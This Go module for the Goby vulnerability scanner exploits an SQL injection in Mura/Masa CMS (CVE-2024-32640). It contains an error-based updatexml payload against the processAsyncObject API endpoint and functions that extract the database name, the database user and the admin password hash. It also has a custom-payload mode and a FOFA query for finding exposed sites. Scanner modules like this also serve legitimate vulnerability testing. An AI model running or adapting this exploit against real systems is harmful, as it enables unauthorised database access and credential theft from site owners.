package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Mura CMS /index.cfm/_api/json/v1/default SQL Injection Vulnerability(CVE-2024-32640)",
    "Description": "<p>Masa CMS is a digital experience platform, created by blueriver as Mura CMS, forked by We Are North. Masa CMS was designed to build ambitious web, multi-channel, business-to-business and business-to-employee applications, and create Flow in the digital experience for Content Managers, Content Contributors, Marketers and Developers. </p><p>Mura CMS /index.cfm/_api/json/v1/default/ endpoint has an SQL injection vulnerability. Attackers can exploit this vulnerability to execute SQL commands and retrieve database data.</p>",
    "Product": "Mura-CMS",
    "Homepage": "http://www.getmura.com",
    "DisclosureDate": "2024-05-14",
    "PostTime": "2024-05-14",
    "Author": "2783712916@qq.com",
    "FofaQuery": "body=\"Mura CMS\" || header=\"Mura CMS\" || banner=\"Mura CMS\"",
    "GobyQuery": "body=\"Mura CMS\" || header=\"Mura CMS\" || banner=\"Mura CMS\"",
    "Level": "3",
    "Impact": "<p>Mura CMS /index.cfm/_api/json/v1/default/ endpoint has an SQL injection vulnerability. Attackers can exploit this vulnerability to execute SQL commands and retrieve database data.</p>",
    "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability. </p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p>",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32640",
        "https://mp.weixin.qq.com/s/wGRM_WFu_x21aIRHWD-m-g"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "getDatabase,getDBUser,getUserPwd,custom,sqlPoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "x\\' and updatexml(1,concat(0x7e,(SELECT CHAR(97, 100, 109, 105, 110)),0x7e),1)-- a",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.cfm/_api/json/v1/default/?method=processAsyncObject",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "object=displayregion&contenthistid=x\\'&previewid=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "select tcontentobjects.object",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/index.cfm/_api/json/v1/default/?method=processAsyncObject"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "Hotspot"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-32640"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "Masa/Mura CMS /index.cfm/_api/json/v1/default/ SQL 注入漏洞（CVE-2024-32640）",
            "Product": "Mura-CMS",
            "Description": "<p>Mura CMS是一个强大的企业网站解决方案，可用于创建和管理公司网站、产品目录、新闻发布、客户支持和联系信息等内容。学校、大学和培训机构也可以使用Mura CMS来创建在线学习平台、课程目录和学生信息系统。&nbsp;</p><p>Mura CMS /index.cfm/_api/json/v1/default/ 接口存在SQL注入漏洞，攻击者利用该漏洞可以执行sql语句，获取数据库数据。<br></p>",
            "Recommendation": "<p>1、联系厂商获取修复漏洞措施&nbsp;</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p>",
            "Impact": "<p>Mura CMS /index.cfm/_api/json/v1/default/ 接口存在SQL注入漏洞，攻击者利用该漏洞可以执行sql语句，获取数据库数据。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "热点"
            ]
        },
        "EN": {
            "Name": "Mura CMS /index.cfm/_api/json/v1/default SQL Injection Vulnerability(CVE-2024-32640)",
            "Product": "Mura-CMS",
            "Description": "<p>Masa CMS is a digital experience platform, created by blueriver as Mura CMS, forked by We Are North. Masa CMS was designed to build ambitious web, multi-channel, business-to-business and business-to-employee applications, and create Flow in the digital experience for Content Managers, Content Contributors, Marketers and Developers.&nbsp;</p><p>Mura CMS /index.cfm/_api/json/v1/default/ endpoint has an SQL injection vulnerability. Attackers can exploit this vulnerability to execute SQL commands and retrieve database data.<br></p>",
            "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.&nbsp;</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.<br></p>",
            "Impact": "<p>Mura CMS /index.cfm/_api/json/v1/default/ endpoint has an SQL injection vulnerability. Attackers can exploit this vulnerability to execute SQL commands and retrieve database data.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "Hotspot"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10949"
}`

	sqlInjectionFuncX87Yu := func(hostInfo *httpclient.FixUrl, sqlPayload string) string {
		httpConfig := httpclient.NewPostRequestConfig("/index.cfm/_api/json/v1/default/?method=processAsyncObject")
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")

		body := `object=displayregion&contenthistid=x\' and updatexml(1,concat(0x7e,(` + sqlPayload + `),0x7e),1)-- a&previewid=1`
		httpConfig.Data = body
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return ""
		}

		if resp.StatusCode == 500 && strings.Contains(resp.Utf8Html, "XPATH syntax error") {

			shellPath := regexp.MustCompile(`XPATH syntax error: '~(.*?)~'`).FindStringSubmatch(string(resp.Utf8Html))
			var msg string
			if len(shellPath) > 1 {
				msg = shellPath[1]
			} else {
				msg = resp.Utf8Html
			}
			return msg
		}
		return ""
	}

	customSqlInjectionFuncre4Yu := func(hostInfo *httpclient.FixUrl, sqlPayload string) string {
		httpConfig := httpclient.NewPostRequestConfig("/index.cfm/_api/json/v1/default/?method=processAsyncObject")
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")

		body := `object=displayregion&contenthistid=` + sqlPayload + `&previewid=1`
		httpConfig.Data = body
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return ""
		}
		if resp.StatusCode == 500 {

			return resp.Utf8Html
		}
		return ""
	}

	getPwdXsd32x := func(hostInfo *httpclient.FixUrl) string {
		//获取账号密码（默认表默认字段）
		//获取长度：select length(Password) from tusers WHERE UserName=(SELECT CHAR(97, 100, 109, 105, 110))
		//最多回显32个字符，除去~~就是30：select length(Password) from tusers WHERE UserName=(SELECT CHAR(97, 100, 109, 105, 110))

		getPasswd1 := "select substr(Password,1,30) from tusers WHERE UserName=(SELECT CHAR(97, 100, 109, 105, 110))"
		getPasswd2 := "select substr(Password,31,60) from tusers WHERE UserName=(SELECT CHAR(97, 100, 109, 105, 110))"

		//getPwdLength := "select length(Password) from tusers WHERE UserName=(SELECT CHAR(97, 100, 109, 105, 110))"
		pwd1 := sqlInjectionFuncX87Yu(hostInfo, getPasswd1)
		if pwd1 == "" {
			return "无法获取默认表账号密码"
		}

		pwd2 := sqlInjectionFuncX87Yu(hostInfo, getPasswd2)

		return "admin:" + pwd1 + pwd2
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			attackType := ss.Params["attackType"].(string)
			custom := ss.Params["custom"].(string)

			if attackType == "getDatabase" {

				getDatabase := "database()"
				msg := sqlInjectionFuncX87Yu(expResult.HostInfo, getDatabase)
				if msg == "" {
					expResult.Output = "获取失败"
					return expResult
				}

				expResult.Success = true
				expResult.Output = msg
				return expResult

			} else if attackType == "getDBUser" {

				getDatabase := "user()"
				msg := sqlInjectionFuncX87Yu(expResult.HostInfo, getDatabase)
				if msg == "" {
					expResult.Output = "获取失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = msg
				return expResult

			} else if attackType == "getUserPwd" {

				msg := getPwdXsd32x(expResult.HostInfo)
				if msg == "" {
					expResult.Output = "获取失败"
					return expResult
				} else if strings.Contains(msg, "无法获取默认表账号密码") {
					expResult.Output = msg
					return expResult
				}
				expResult.Success = true
				expResult.Output = msg
				return expResult

			} else if attackType == "custom" {
				msg := customSqlInjectionFuncre4Yu(expResult.HostInfo, custom)
				if msg == "" {
					expResult.Output = "获取失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = msg
				return expResult

			} else if attackType == "sqlPoint" {

				expResult.Success = true
				expResult.Output = `POST /index.cfm/_api/json/v1/default/?method=processAsyncObject HTTP/1.1
Host: 52.14.180.33
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 114

object=displayregion&contenthistid={{{SqlInjection}}}&previewid=1`
				return expResult

			} else {
				expResult.Output = "未知的攻击方式"
				return expResult
			}
		},
	))
}
